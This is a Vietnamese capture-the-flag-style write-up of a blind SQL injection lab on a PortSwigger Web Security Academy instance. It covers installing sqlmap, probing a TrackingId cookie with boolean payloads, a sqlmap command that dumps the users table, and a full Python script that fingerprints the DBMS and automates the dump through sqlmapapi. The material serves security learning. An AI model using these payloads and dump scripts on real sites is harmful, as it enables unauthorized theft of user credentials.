
> [!NOTE]
> Cách cài **sqlmap**:
> * Clone SQLmap về một thư mục cố định: 
> ```bash
> cd C:\
> git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap
> ```
> * Di chuyển đến `/sqlmap`
> ```bash
> cd C:\sqlmap
> ```
> * Tạo file `sqlmap.cmd` với nội dung:
> ```bash
> @python "%~dp0sqlmap.py" %*
> ```
> * Thêm `sqlmap` vào biến môi trường:
> 
> Bấm nút **Windows** và tìm chữ **Edit the system environment variable** -> **Environment Variables** -> **User variables for** -> Bấm vào dòng **Path** -> Chọn **New**
>
> Sau khi chọn **New** sẽ hiện ra 1 loạt các danh sách, ví dụ như sau:
> 
> <img width="766" height="625" alt="image" src="https://github.com/user-attachments/assets/76ba4f4c-69f9-4f01-ae0d-36ddc17e1404" />
> 
> Bấm chọn **New** tiếp, dán đường dẫn thư mục của bạn vào, ví dụ `C:\sqlmap`. Nhấn OK -> OK -> OK để lưu lại toàn bộ
> 
> * Test xem `sqlmap` được cài chưa:
> ```bash
> sqlmap -h
> ```

### Blind SQLi 



* **1. Xác định nơi có lỗi Blind SQLi**:

  Các xác định lỗi: thử dấu `'` trong các nơi sau: login, search, filter, cookie, User-Agent, JSON field, URL parameter

  Ví dụ ta có 1 HTTP request:
  ```http
  GET / HTTP/1.1
  Host: vulnerable.com
  Cookie: TrackingId=abcdef123456
  ```

  Ta thử thêm dấu `'` vào Cookie và thấy trang web bị lỗi:

  ```http
  GET / HTTP/1.1
  Host: vulnerable.com
  Cookie: TrackingId=abcdef123456' <--- Thêm dấu '
  ```

  Các dấu hiệu cho thấy web __có khả năng__ bị SQLi: 500 error, response khác, page trắng, timing lạ

  Với cụ thể lab này, ta thấy sự khác biệt cụ thể khi thay đổi ở Cookie. Khi dùng `' OR 1=1 -- ` sẽ khác với `'OR 1=2 -- ` ở dòng chữ `Welcome Back`. Tất nhiên chỉ ở trường cookie mới như vậy còn các cái khác thì không
  
  <img width="1536" height="812" alt="image" src="https://github.com/user-attachments/assets/567711b6-c210-4965-aa38-d36de0337f70" />

* **2. Tìm cách khai thác**

* Cách 1: Sử dụng `requests` kết hợp với binary search và bruteforce để tìm password

> [!NOTE]
> Tất nhiên, do bài cho sẵn nên mới biết là dump thẳng từ đâu, tên là gì. Chứ nếu đề bài có database lớn, không có gợi ý thì đoán đến Tết chưa chắc xong.
> Nó như một hạn chế với dạng Boolean-Based Blind SQLi này vậy.
>
> <img width="875" height="423" alt="image" src="https://github.com/user-attachments/assets/e87e12c4-6889-4aad-b075-4e97d07a95b7" />


* Cách 2: Sử dụng `sqlmap`
  * Dùng `sqlmap` ở CLI:
    ```bash
    sqlmap -u "https://0ac3001d0452137380907bc1007e00ae.web-security-academy.net/filter?category=Tech+gifts" --cookie="session=FtGbs3T15EPKKLvbYVsisfjpuK9SQV60; TrackingId=y56Uc3lYbljGpVoG" -p "TrackingId" --level=2 --batch --threads=10 -D public -T users --dump --no-logging --output-dir="%TEMP%\sqlmap_temp" --dbms="PostgreSQL"
    ```

  * Dùng `sqlmapapi` để kết hợp luôn vào script python với các hàm đã tự viết:
  ```python
  import subprocess
  import time
  import requests
  import sys
  from urllib.parse import urljoin, urlencode
  import urllib3
  
  from pprint import pprint
  
  # Tắt cảnh báo SSL không an toàn
  urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
  
  # Đường dẫn đến file sqlmapapi.py trên máy của bạn
  SQLMAPAPI_PATH = r"C:\sqlmap\sqlmapapi.py"
  PORT = "8775"
  API_URL = f"http://127.0.0.1:{PORT}"
  
  API_USER = "admin"
  API_PASS = "securepassword123"
  
  # ======================= [BẮT ĐẦU] PASTE CODE TỪ CURLCONVERTER VÀO ĐÂY =======================
  # (Thay thế các thông tin dưới đây bằng request thực tế của bạn, hãy nhớ xóa phần request.get() ở cuối khi copy từ curlconverter)
  import requests
  
  cookies = {
      'TrackingId': 'sK8NynIjHU7LqoLn',
      'session': 'wzZQdLlle3buV6G70KbvUEc2gUEFaYe9',
  }
  
  headers = {
      'Host': '0ad500e303aa63928535037800280034.web-security-academy.net',
      'Sec-Ch-Ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
      'Sec-Ch-Ua-Mobile': '?0',
      'Sec-Ch-Ua-Platform': '"Windows"',
      'Upgrade-Insecure-Requests': '1',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      'Sec-Fetch-Site': 'same-origin',
      'Sec-Fetch-Mode': 'navigate',
      'Sec-Fetch-User': '?1',
      'Sec-Fetch-Dest': 'document',
      'Referer': 'https://0ad500e303aa63928535037800280034.web-security-academy.net/',
      # 'Accept-Encoding': 'gzip, deflate, br',
      'Accept-Language': 'en-US,en;q=0.9',
      'Priority': 'u=0, i',
      # 'Cookie': 'TrackingId=sK8NynIjHU7LqoLn; session=wzZQdLlle3buV6G70KbvUEc2gUEFaYe9',
  }
  
  params = {
      'category': 'Gifts',
  }

  # ======================= [KẾT THÚC] PASTE CODE TỪ CURLCONVERTER =======================
  
  host = headers.get('Host') or headers.get(':authority')
  user_agent = headers.get('User-Agent')
  referer = headers.get('Referer')
  
  sec_ch_ua = headers.get('Sec-Ch-Ua')
  sec_ch_ua_mobile = headers.get('Sec-Ch-Ua-Mobile')
  sec_ch_ua_platform = headers.get('Sec-Ch-Ua-Platform')
  
  accept = headers.get('Accept')
  accept_language = headers.get('Accept-Language')
  
  sec_fetch_site = headers.get('Sec-Fetch-Site')
  sec_fetch_mode = headers.get('Sec-Fetch-Mode')
  sec_fetch_user = headers.get('Sec-Fetch-User')
  sec_fetch_dest = headers.get('Sec-Fetch-Dest')
  
  cache_control = headers.get('Cache-Control')
  upgrade_insecure = headers.get('Upgrade-Insecure-Requests')
  priority = headers.get('Priority')
  
  # Cookies and Sessions
  
  cookie_list = [[k, v] for k, v in cookies.items()]
  
  '''
  Format of the list:
  
  cookie_list = [
      [cookie_list[0][0], cookie_list[0][1]], 
      [cookie_list[1][0], cookie_list[1][1]],
      ...
  ]
  
  Example:
  
  cookie_list = [
      ['session', 'Kjj4UlUqtepA8nZck8kskDidH6tj17WX'],
      ['TrackingId', 'ababascabscajsdb'],
  ]
  
  Modify:
  
  cookie_list[1][1] = 'voucher_cdecdaf'
  
  
  '''
  
  cookies = dict(cookie_list)
  
  # Parameters
  
  param_list = [[o, u] for o, u in params.items()]
  
  
  '''
  Format of the list:
  
  param_list = [
      [param_list[0][0], param_list[0][1]], 
      [param_list[1][0], param_list[1][1]],
      ...
  ]
  
  Example:
  
  param_list = [
      ['category', 'Pets'],
      ...
  ]
  
  Modify:
  
  param_list[1][1] = "Pets' UNION SELECT ... FROM ... WHERE ..."
  
  '''
  
  params = dict(param_list)
  url = urljoin(referer, '/filter')
  
  
  
  
  # --------------------------------------------------------------------------------------
  # CÁC HÀM KIỂM TRA THỦ CÔNG CỦA BẠN (Dùng để tối ưu hóa đầu vào cho SQLMap)
  # --------------------------------------------------------------------------------------
  
  DEFAULT_TRUE_INDICATOR = "Welcome back!"
  DEFAULT_INJECT_IN = "cookies"
  DEFAULT_INJECT_IN_KEY = "TrackingId"
  
  def check_boolean_base_sqli(payload, inject_in=DEFAULT_INJECT_IN, key=DEFAULT_INJECT_IN_KEY, indicator=DEFAULT_TRUE_INDICATOR):
      req_args = {
          "headers": headers.copy(),
          "cookies": cookies.copy(),
          "params": params.copy()
      }
      target_dict = req_args.get(inject_in)
      if target_dict:
          base_val = target_dict.get(key, "")
          target_dict[key] = f"{base_val}{payload}".strip()
  
      try:
          response = requests.get(url, verify=False, **req_args)
          return indicator in response.text
      except Exception as e:
          print(f"\n[-] Connection Error: {e}")
          return False
  
  def identify_dbms():
      print("[*] Đang xác định hệ quản trị cơ sở dữ liệu (DBMS)...")
      
      # Thử PostgreSQL
      pg_payload = "' AND EXISTS(SELECT * FROM pg_catalog.pg_class) -- "
      if check_boolean_base_sqli(pg_payload):
          print("[+] Xác định DBMS: PostgreSQL")
          return "PostgreSQL"
      
      # Thử Oracle
      oracle_payload = "' AND EXISTS(SELECT banner FROM v$version) -- "
      if check_boolean_base_sqli(oracle_payload):
          print("[+] Xác định DBMS: Oracle")
          return "Oracle"
      
      # Thử MySQL
      mysql_payload = "' AND @@version_comment IS NOT NULL -- "
      if check_boolean_base_sqli(mysql_payload):
          print("[+] Xác định DBMS: MySQL")
          return "MySQL"
  
      # Thử Microsoft SQL Server
      mssql_payload = "' AND EXISTS(SELECT * FROM sys.objects) -- "
      if check_boolean_base_sqli(mssql_payload):
          print("[+] Xác định DBMS: Microsoft SQL Server")
          return "Microsoft SQL Server"
  
      print("[-] Không xác định chắc chắn được DBMS.")
      return None
  
  
  # --------------------------------------------------------------------------------------
  # HÀM CẤU HÌNH SQLMAP (ĐÃ TỐI ƯU HÓA)
  # --------------------------------------------------------------------------------------
  
  def build_sqlmap_options(detected_dbms):
      if params:
          full_url = f"{url}?{urlencode(params)}"
      else:
          full_url = url
  
      cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
  
      ignored_headers = ['host', 'cookie']
      headers_list = [f"{k}: {v}" for k, v in headers.items() if k.lower() not in ignored_headers]
      headers_str = "\n".join(headers_list)
  
      # options = {
      #     "url": full_url,
      #     "cookie": cookie_str,
      #     "headers": headers_str,
      #     "batch": True,
          
      #     # --- BƯỚC KHAI THÁC MỤC TIÊU (DUMP DỮ LIỆU) ---
      #     "getTables": True,               # Yêu cầu lấy danh sách bảng của Database hiện tại
      #     # "commonTables": True,          # Hoặc bạn có thể dùng để brute-force bảng nếu DBMS là PostgreSQL/Oracle
          
      #     # --- ĐIỀU CHỈNH ĐỂ KHÔNG ĐOÁN DBMS VÀ KỸ THUẬT ---
      #     "level": 2,                      # Bắt buộc vì lỗi nằm ở Cookie
      #     "testParameter": "TrackingId",   # Chỉ quét đúng tham số này
      #     "technique": "B",                     # Ép sqlmap CHỈ dùng kỹ thuật Boolean-based blind, bỏ qua 5 kỹ thuật khác
      #     "threads": "10",
      # }
  
      options = {
          "url": full_url,
          "cookie": cookie_str,
          "headers": headers_str,
          "batch": True,
  
          "testParameter": "TrackingId",  # Tương ứng cờ -p
          "level": 2,  # Bắt buộc để quét Cookie
          "threads": 10,
          "string": "Welcome back!", ## --string=""
          "technique": "B",
  
          "dbms": "PostgreSQL",  # --dbms="" .Chỉ định thẳng hệ quản trị cơ sở dữ liệu
          "db": "public",  # Tương ứng cờ -D (-D public)
          "tbl": "users",  # Tương ứng cờ -T (-T users)
          "dumpTable": True,  # Tương ứng cờ --dump khi đi kèm bảng cụ thể
  
          # "disableLogging": True,  # Tương ứng cờ --no-logging
          "outputDir": "%TEMP%\\sqlmap_temp",
      }
  
  
      # Nếu hàm tự viết của bạn tìm ra DBMS, truyền thẳng vào đây để sqlmap không quét đoán DBMS nữa
      if detected_dbms:
          options["dbms"] = detected_dbms
  
      return options
  
  
  # --------------------------------------------------------------------------------------
  # TIẾN TRÌNH CHẠY CHÍNH
  # --------------------------------------------------------------------------------------
  
  if __name__ == "__main__":
      # 1. Chạy hàm kiểm tra lỗi của bạn trước
      print("[*] Đang khởi chạy tiền kiểm tra lỗi...")
      if not check_boolean_base_sqli(payload="' AND 1=1 -- "):
          print("[-] Kiểm tra thất bại. Vui lòng xác thực lại Session/Cookie!")
          sys.exit(1)
      print("[+] Xác nhận lỗi SQL Injection hoạt động tốt.")
  
      # 2. Chạy hàm nhận diện DBMS của bạn
      detected_dbms = identify_dbms()
  
      # 3. Khởi động SQLMap Server ngầm
      print("\n[+] Đang khởi động SQLMap API Server ngầm...")
      try:
          api_process = subprocess.Popen(
              [sys.executable, SQLMAPAPI_PATH, "-s", "-p", PORT, "--username", API_USER, "--password", API_PASS],
              stdout=subprocess.DEVNULL, 
              stderr=subprocess.DEVNULL
          )
          time.sleep(3)
      except Exception as e:
          print(f"[-] Không thể bật SQLMap API: {e}")
          sys.exit(1)
  
      try:
          auth_cred = (API_USER, API_PASS)
  
          # Tạo Task
          response = requests.get(f"{API_URL}/task/new", auth=auth_cred)
          task_id = response.json().get("taskid")
          print(f"[+] Đã tạo Task ID: {task_id}")
  
          # Nạp cấu hình tối ưu hóa dựa trên DBMS đã nhận diện được ở Bước 2
          scan_options = build_sqlmap_options(detected_dbms)
  
          # Khởi động quét
          requests.post(f"{API_URL}/scan/{task_id}/start",
                          json=scan_options,
                          auth=auth_cred)
          
          
          print(f"[+] Đang yêu cầu SQLMap trích xuất cấu trúc dữ liệu...")
          
          # 4. Theo dõi trạng thái và in kết quả thời gian thực
          last_log_index = 0  # Biến lưu vị trí log cuối cùng đã đọc
          
          while True:
              # Lấy trạng thái quét
              status_data = requests.get(f"{API_URL}/scan/{task_id}/status", auth=auth_cred).json()
              status = status_data.get("status")
  
              # Lấy toàn bộ log từ đầu đến hiện tại
              log_data = requests.get(f"{API_URL}/scan/{task_id}/log", auth=auth_cred).json()
              logs = log_data.get("log", [])
              
              # Nếu có log mới phát sinh kể từ lần kiểm tra trước
              if len(logs) > last_log_index:
                  for i in range(last_log_index, len(logs)):
                      msg = logs[i].get("message", "")
                      
                      # Nếu phát hiện dòng log chứa dữ liệu đã được giải mã (retrieved)
                      if "retrieved:" in msg.lower():
                          # Làm nổi bật dòng chứa kết quả tìm được
                          print(f"\n[★ TÌM THẤY] {msg}\n")
                      else:
                          # In các log tiến trình thông thường của SQLMap
                          print(f"[SQLMap Log] {msg}")
                  
                  # Cập nhật lại chỉ số log đã đọc để tránh in trùng lặp
                  last_log_index = len(logs)
                  
              if status == "terminated":
                  print("[+] SQLMap đã quét xong hoàn toàn!")
                  break
                  
              # Đợi 2 giây trước khi cập nhật tiếp (giảm từ 4s xuống 2s để hiển thị mượt hơn)
              time.sleep(2)
  
          # Xuất dữ liệu cuối cùng
          data_resp = requests.get(f"{API_URL}/scan/{task_id}/data", auth=auth_cred).json()
          print("\n" + "="*20 + " KẾT QUẢ TỪ SQLMAP " + "="*20)
          results = data_resp.get("data", [])
          if results:
              for item in results:
                  if "value" in item:
                      print(item["value"])
          else:
              print("[-] Không tìm thấy dữ liệu mong muốn.")
              
      finally:
          # Tắt server ngầm giải phóng cổng
          print("\n[+] Đang tắt SQLMap API Server...")
          api_process.terminate()
          api_process.wait()
          print("[+] Đã dọn dẹp hệ thống sạch sẽ.")
  ```
    
